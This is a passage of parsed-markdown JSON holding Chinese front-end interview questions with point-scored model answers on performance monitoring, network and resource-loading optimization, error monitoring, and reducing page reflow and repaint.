Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。\\n- **1：** 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。\\n- **1：** 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。\\n- **1：** 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。\\n","task":false,"loose":false,"text":"**1：** 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。","tokens":[{"type":"text","raw":"**1：** 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。","text":"**1：** 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。","text":" 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。\\n","task":false,"loose":false,"text":"**1：** 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。","tokens":[{"type":"text","raw":"**1：** 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。","text":"**1：** 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。","text":" 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。\\n","task":false,"loose":false,"text":"**1：** 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。","tokens":[{"type":"text","raw":"**1：** 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。","text":"**1：** 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。","text":" 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。","task":false,"loose":false,"text":"**1：** 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。","tokens":[{"type":"text","raw":"**1：** 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。","text":"**1：** 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。","text":" 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何进行前端网络优化\\n\\n","depth":2,"text":"如何进行前端网络优化","tokens":[{"type":"text","raw":"如何进行前端网络优化","text":"如何进行前端网络优化","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 使用CDN加速静态资源的加载，减少网络延迟。\\n- **1：** 启用HTTP/2协议，提高多个资源并行加载的效率。\\n- **1：** 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。\\n- **1：** 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。\\n- **1：** 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用CDN加速静态资源的加载，减少网络延迟。\\n","task":false,"loose":false,"text":"**1：** 使用CDN加速静态资源的加载，减少网络延迟。","tokens":[{"type":"text","raw":"**1：** 使用CDN加速静态资源的加载，减少网络延迟。","text":"**1：** 使用CDN加速静态资源的加载，减少网络延迟。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用CDN加速静态资源的加载，减少网络延迟。","text":" 使用CDN加速静态资源的加载，减少网络延迟。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 启用HTTP/2协议，提高多个资源并行加载的效率。\\n","task":false,"loose":false,"text":"**1：** 启用HTTP/2协议，提高多个资源并行加载的效率。","tokens":[{"type":"text","raw":"**1：** 启用HTTP/2协议，提高多个资源并行加载的效率。","text":"**1：** 启用HTTP/2协议，提高多个资源并行加载的效率。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 启用HTTP/2协议，提高多个资源并行加载的效率。","text":" 启用HTTP/2协议，提高多个资源并行加载的效率。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。\\n","task":false,"loose":false,"text":"**1：** 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。","tokens":[{"type":"text","raw":"**1：** 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。","text":"**1：** 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。","text":" 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。\\n","task":false,"loose":false,"text":"**1：** 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。","tokens":[{"type":"text","raw":"**1：** 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。","text":"**1：** 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。","text":" 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。","task":false,"loose":false,"text":"**1：** 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。","tokens":[{"type":"text","raw":"**1：** 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。","text":"**1：** 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。","text":" 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何进行前端资源加载优化\\n\\n","depth":2,"text":"如何进行前端资源加载优化","tokens":[{"type":"text","raw":"如何进行前端资源加载优化","text":"如何进行前端资源加载优化","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 延迟加载非关键资源，如图片、视频等，提高页面加载速度。\\n- **1：** 使用懒加载技术，按需加载页面内容，减少首次加载时间。\\n- **1：** 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。\\n- **1：** 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 延迟加载非关键资源，如图片、视频等，提高页面加载速度。\\n","task":false,"loose":false,"text":"**1：** 延迟加载非关键资源，如图片、视频等，提高页面加载速度。","tokens":[{"type":"text","raw":"**1：** 延迟加载非关键资源，如图片、视频等，提高页面加载速度。","text":"**1：** 延迟加载非关键资源，如图片、视频等，提高页面加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 延迟加载非关键资源，如图片、视频等，提高页面加载速度。","text":" 延迟加载非关键资源，如图片、视频等，提高页面加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用懒加载技术，按需加载页面内容，减少首次加载时间。\\n","task":false,"loose":false,"text":"**1：** 使用懒加载技术，按需加载页面内容，减少首次加载时间。","tokens":[{"type":"text","raw":"**1：** 使用懒加载技术，按需加载页面内容，减少首次加载时间。","text":"**1：** 使用懒加载技术，按需加载页面内容，减少首次加载时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用懒加载技术，按需加载页面内容，减少首次加载时间。","text":" 使用懒加载技术，按需加载页面内容，减少首次加载时间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。\\n","task":false,"loose":false,"text":"**1：** 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。","tokens":[{"type":"text","raw":"**1：** 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。","text":"**1：** 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。","text":" 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。","task":false,"loose":false,"text":"**1：** 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。","tokens":[{"type":"text","raw":"**1：** 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。","text":"**1：** 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。","text":" 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 前端错误监控的方案\\n\\n","depth":2,"text":"前端错误监控的方案","tokens":[{"type":"text","raw":"前端错误监控的方案","text":"前端错误监控的方案","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。\\n- **1：** JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。\\n- **1：** 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。\\n- **1：** 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。\\n","task":false,"loose":false,"text":"**1：** Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。","tokens":[{"type":"text","raw":"**1：** Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。","text":"**1：** Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。","text":" Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。\\n","task":false,"loose":false,"text":"**1：** JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。","tokens":[{"type":"text","raw":"**1：** JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。","text":"**1：** JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。","text":" JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。\\n","task":false,"loose":false,"text":"**1：** 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。","tokens":[{"type":"text","raw":"**1：** 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。","text":"**1：** 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。","text":" 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。","task":false,"loose":false,"text":"**1：** 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。","tokens":[{"type":"text","raw":"**1：** 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。","text":"**1：** 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。","text":" 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何减少页面的回流和重绘？\\n\\n","depth":2,"text":"如何减少页面的回流和重绘？","tokens":[{"type":"text","raw":"如何减少页面的回流和重绘？","text":"如何减少页面的回流和重绘？","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 合并DOM操作：\\n  + 使用文档片段（DocumentFragment）批量插入节点\\n  + 使用innerHTML一次性插入大量内容\\n  + 使用display: none隐藏元素后再进行多次操作，最后再显示\\n\\n- **1：** 缓存布局信息：\\n  + 避免在循环中多次读取offset、scroll等属性\\n  + 使用变量缓存布局信息\\n\\n- **1：** 使用CSS3特性：\\n  + 使用transform和opacity替代top、left等属性\\n  + 使用will-change提示浏览器优化\\n\\n- **1：** 减少复杂的选择器：\\n  + 避免使用过于复杂的CSS选择器\\n  + 使用类选择器代替后代选择器\\n\\n- **1：** 优化动画和过渡：\\n  + 使用requestAnimationFrame进行动画\\n  + 避免在动画中使用高开销的CSS属性","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 合并DOM操作：\\n  + 使用文档片段（DocumentFragment）批量插入节点\\n  + 使用innerHTML一次性插入大量内容\\n  + 使用display: none隐藏元素后再进行多次操作，最后再显示\\n\\n","task":false,"loose":true,"text":"**1：** 合并DOM操作：\\n+ 使用文档片段（DocumentFragment）批量插入节点\\n+ 使用innerHTML一次性插入大量内容\\n+ 使用display: none隐藏元素后再进行多次操作，最后再显示\\n","tokens":[{"type":"text","raw":"**1：** 合并DOM操作：\\n","text":"**1：** 合并DOM操作：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 合并DOM操作：","text":" 合并DOM操作：","escaped":false}]},{"type":"list","raw":"+ 使用文档片段（DocumentFragment）批量插入节点\\n+ 使用innerHTML一次性插入大量内容\\n+ 使用display: none隐藏元素后再进行多次操作，最后再显示\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用文档片段（DocumentFragment）批量插入节点\\n","task":false,"loose":false,"text":"使用文档片段（DocumentFragment）批量插入节点","tokens":[{"type":"text","raw":"使用文档片段（DocumentFragment）批量插入节点","text":"使用文档片段（DocumentFragment）批量插入节点","tokens":[{"type":"text","raw":"使用文档片段（DocumentFragment）批量插入节点","text":"使用文档片段（DocumentFragment）批量插入节点","escaped":false}]}]},{"type":"list_item","raw":"+ 使用innerHTML一次性插入大量内容\\n","task":false,"loose":false,"text":"使用innerHTML一次性插入大量内容","tokens":[{"type":"text","raw":"使用innerHTML一次性插入大量内容","text":"使用innerHTML一次性插入大量内容","tokens":[{"type":"text","raw":"使用innerHTML一次性插入大量内容","text":"使用innerHTML一次性插入大量内容","escaped":false}]}]},{"type":"list_item","raw":"+ 使用display: none隐藏元素后再进行多次操作，最后再显示","task":false,"loose":false,"text":"使用display: none隐藏元素后再进行多次操作，最后再显示","tokens":[{"type":"text","raw":"使用display: none隐藏元素后再进行多次操作，最后再显示","text":"使用display: none隐藏元素后再进行多次操作，最后再显示","tokens":[{"type":"text","raw":"使用display: none隐藏元素后再进行多次操作，最后再显示","text":"使用display: none隐藏元素后再进行多次操作，最后再显示","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 缓存布局信息：\\n  + 避免在循环中多次读取offset、scroll等属性\\n  + 使用变量缓存布局信息\\n\\n","task":false,"loose":true,"text":"**1：** 缓存布局信息：\\n+ 避免在循环中多次读取offset、scroll等属性\\n+ 使用变量缓存布局信息\\n","tokens":[{"type":"text","raw":"**1：** 缓存布局信息：\\n","text":"**1：** 缓存布局信息：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 缓存布局信息：","text":" 缓存布局信息：","escaped":false}]},{"type":"list","raw":"+ 避免在循环中多次读取offset、scroll等属性\\n+ 使用变量缓存布局信息\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 避免在循环中多次读取offset、scroll等属性\\n","task":false,"loose":false,"text":"避免在循环中多次读取offset、scroll等属性","tokens":[{"type":"text","raw":"避免在循环中多次读取offset、scroll等属性","text":"避免在循环中多次读取offset、scroll等属性","tokens":[{"type":"text","raw":"避免在循环中多次读取offset、scroll等属性","text":"避免在循环中多次读取offset、scroll等属性","escaped":false}]}]},{"type":"list_item","raw":"+ 使用变量缓存布局信息","task":false,"loose":false,"text":"使用变量缓存布局信息","tokens":[{"type":"text","raw":"使用变量缓存布局信息","text":"使用变量缓存布局信息","tokens":[{"type":"text","raw":"使用变量缓存布局信息","text":"使用变量缓存布局信息","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 使用CSS3特性：\\n  + 使用transform和opacity替代top、left等属性\\n  + 使用will-change提示浏览器优化\\n\\n","task":false,"loose":true,"text":"**1：** 使用CSS3特性：\\n+ 使用transform和opacity替代top、left等属性\\n+ 使用will-change提示浏览器优化\\n","tokens":[{"type":"text","raw":"**1：** 使用CSS3特性：\\n","text":"**1：** 使用CSS3特性：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用CSS3特性：","text":" 使用CSS3特性：","escaped":false}]},{"type":"list","raw":"+ 使用transform和opacity替代top、left等属性\\n+ 使用will-change提示浏览器优化\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用transform和opacity替代top、left等属性\\n","task":false,"loose":false,"text":"使用transform和opacity替代top、left等属性","tokens":[{"type":"text","raw":"使用transform和opacity替代top、left等属性","text":"使用transform和opacity替代top、left等属性","tokens":[{"type":"text","raw":"使用transform和opacity替代top、left等属性","text":"使用transform和opacity替代top、left等属性","escaped":false}]}]},{"type":"list_item","raw":"+ 使用will-change提示浏览器优化","task":false,"loose":false,"text":"使用will-change提示浏览器优化","tokens":[{"type":"text","raw":"使用will-change提示浏览器优化","text":"使用will-change提示浏览器优化","tokens":[{"type":"text","raw":"使用will-change提示浏览器优化","text":"使用will-change提示浏览器优化","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 减少复杂的选择器：\\n  + 避免使用过于复杂的CSS选择器\\n  + 使用类选择器代替后代选择器\\n\\n","task":false,"loose":true,"text":"**1：** 减少复杂的选择器：\\n+ 避免使用过于复杂的CSS选择器\\n+ 使用类选择器代替后代选择器\\n","tokens":[{"type":"text","raw":"**1：** 减少复杂的选择器：\\n","text":"**1：** 减少复杂的选择器：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 减少复杂的选择器：","text":" 减少复杂的选择器：","escaped":false}]},{"type":"list","raw":"+ 避免使用过于复杂的CSS选择器\\n+ 使用类选择器代替后代选择器\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 避免使用过于复杂的CSS选择器\\n","task":false,"loose":false,"text":"避免使用过于复杂的CSS选择器","tokens":[{"type":"text","raw":"避免使用过于复杂的CSS选择器","text":"避免使用过于复杂的CSS选择器","tokens":[{"type":"text","raw":"避免使用过于复杂的CSS选择器","text":"避免使用过于复杂的CSS选择器","escaped":false}]}]},{"type":"list_item","raw":"+ 使用类选择器代替后代选择器","task":false,"loose":false,"text":"使用类选择器代替后代选择器","tokens":[{"type":"text","raw":"使用类选择器代替后代选择器","text":"使用类选择器代替后代选择器","tokens":[{"type":"text","raw":"使用类选择器代替后代选择器","text":"使用类选择器代替后代选择器","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 优化动画和过渡：\\n  + 使用requestAnimationFrame进行动画\\n  + 避免在动画中使用高开销的CSS属性","task":false,"loose":true,"text":"**1：** 优化动画和过渡：\\n+ 使用requestAnimationFrame进行动画\\n+ 避免在动画中使用高开销的CSS属性","tokens":[{"type":"text","raw":"**1：** 优化动画和过渡：\\n","text":"**1：** 优化动画和过渡：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 优化动画和过渡：","text":" 优化动画和过渡：","escaped":false}]},{"type":"list","raw":"+ 使用requestAnimationFrame进行动画\\n+ 避免在动画中使用高开销的CSS属性","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用requestAnimationFrame进行动画\\n","task":false,"loose":false,"text":"使用requestAnimationFrame进行动画","tokens":[{"type":"text","raw":"使用requestAnimationFrame进行动画","text":"使用requestAnimationFrame进行动画","tokens":[{"type":"text","raw":"使用requestAnimationFrame进行动画","text":"使用requestAnimationFrame进行动画","escaped":false}]}]},{"type":"list_item","raw":"+ 